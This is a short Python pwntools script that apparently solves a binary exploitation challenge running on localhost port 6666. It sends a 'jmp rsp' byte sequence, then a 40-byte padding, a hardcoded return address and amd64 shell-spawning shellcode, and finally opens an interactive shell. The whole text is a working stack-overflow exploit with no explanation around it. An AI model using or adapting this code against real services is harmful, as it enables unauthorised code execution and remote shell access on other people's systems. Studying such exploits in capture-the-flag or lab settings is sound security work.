from pwn import *
from struct import pack,unpack

ret_address = pack('<Q',0x0000000006020A0)
shellcode = asm(shellcraft.amd64.sh(),arch='amd64')

s = tubes.remote.remote("127.0.0.1",6666)
raw_input('debug')
print s.sendlineafter("? :",'\xff\xe4')
print s.sendlineafter(">",'1')
print s.sendlineafter("\xff\xe4",'a'*40+ret_address+shellcode)

s.interactive()
